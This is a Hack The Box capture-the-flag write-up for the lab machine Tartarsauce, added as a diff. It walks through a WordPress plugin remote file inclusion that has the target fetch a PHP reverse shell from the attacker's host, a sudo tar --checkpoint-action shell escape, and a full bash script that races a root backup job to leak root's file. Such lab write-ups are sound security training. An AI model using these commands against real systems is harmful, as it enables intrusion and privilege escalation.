@@ -1,0 +1,136 @@
+HTB-Tartarsauce-Writeup
+
+IP : 10.10.10.88
+
+Nmap 
+----
+- nmap scans revealed one open port
+	- 80 running Apache httpd 2.4.18
+	- nmap also revealed that robots.txt exists with 5 disallowed entry
+
+Enumeration
+-----------
+- on visiting the site at port 80 we see an ascii art
+- checking the page source and saw a comment "carry on nothing to see here"
+- tried directory brute force against the website and found 2 directories
+	- /webservices
+	- /wp
+
+- /wp looks like a broken wordpress site
+- we check the page source and found a missing / in the url
+
+	href="http:/10.10.10.88/webservices/wp/index.php/feed/"
+
+- we can use the match and replace option of burpsuite to add a filter
+- when we refresh the page we get result but its still a 404 page 
+- since we are dealing with wordpress we can use wpscan to enumerate the site 
+	
+	wpscan -u http://10.10.10.88/webservices/wp/ --enumerate p,t,u
+
+- we found 3 plugins
+	- akismet - v4.0.3
+	- brute-force-login-protection - v1.5.3
+	- gwolle-gb - v2.3.10
+
+- none of it looks vulnerable on a first look
+- reading readme for each reveals something interesting 
+	
+	http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
+
+- the readme says that the gwolle version is changed from 1.5.3 to 2.3.10 to trick wpscan  
+- looks like the author is trying to troll us 
+
+Shell as www-data
+-----------------
+- looking for vulnerabilities in gwolle-gb we found a RFI vulnerability in Gwolle Guestbook v 1.5.3
+- according to this visiting the following link will include a file
+
+	http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ip/path
+
+- we can host a php reverse shell with a python server
+- run a netcat listener
+
+	nc -nlvp 9001
+
+- run that curl again
+
+	 curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.15.99/
+
+- we get a shell back as www-data
+
+Shell as onuma
+--------------
+- on further enumeration we found that www-data can run sudo with no password on /bin/tar
+- we searched for known sudo exploits for tar in GTFObins and found one
+- it works using the --checkpoint-action option of the tar
+
+	  sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+- we got a shell as the user onuma
+- grab the user flag
+
+Priv-esc
+--------
+- we can enumerate processes with pspy32 script
+- found a process running in every 5 minutes
+
+	2018/05/29 07:56:33 CMD: UID=0    PID=24065  | /bin/bash /usr/sbin/backuperer
+
+- the script is running a series of extracting and archiving file while performing integrity checks on the file
+- to exploit this script we can take advantage of the sleep and recursive diff function 
+- during the sleep we can unpack the archive and rearchive it with the contents of /root/root.txt
+- when the script opens up archive and perforn integrity check with diff the file will be different and the contents of both files will end up in the log files 
+- the following script can be used to exploit this easily 
+
+	#!/bin/bash
+
+	# work out of shm
+	cd /dev/shm
+
+	# set both start and cur equal to any backup file if it's there
+	start=$(find /var/tmp -maxdepth 1 -type f -name ".*")
+	cur=$(find /var/tmp -maxdepth 1 -type f -name ".*")
+
+	# loop until there's a change in cur
+	echo "Waiting for archive filename to change..."
+	while [ "$start" == "$cur" -o "$cur" == "" ] ; do
+	    sleep 10;
+	    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
+	done
+
+	# Grab a copy of the archive
+	echo "File changed... copying here"
+	cp $cur .
+
+	# get filename
+	fn=$(echo $cur | cut -d'/' -f4)
+
+	# extract archive
+	tar -zxf $fn
+
+	# remove robots.txt and replace it with link to root.txt
+	rm var/www/html/robots.txt
+	ln -s /root/root.txt var/www/html/robots.txt
+
+	# remove old archive
+	rm $fn
+
+	# create new archive
+	tar czf $fn var
+
+	# put it back, and clean up
+	mv $fn $cur
+	rm $fn
+	rm -rf var
+
+	# wait for results
+	echo "Waiting for new logs..."
+	tail -f /var/backups/onuma_backup_error.txt
+
+- upload the script to the target system and run it 
+
+	./.b.sh
+
+- grab the root flag from the output 
+
+ 
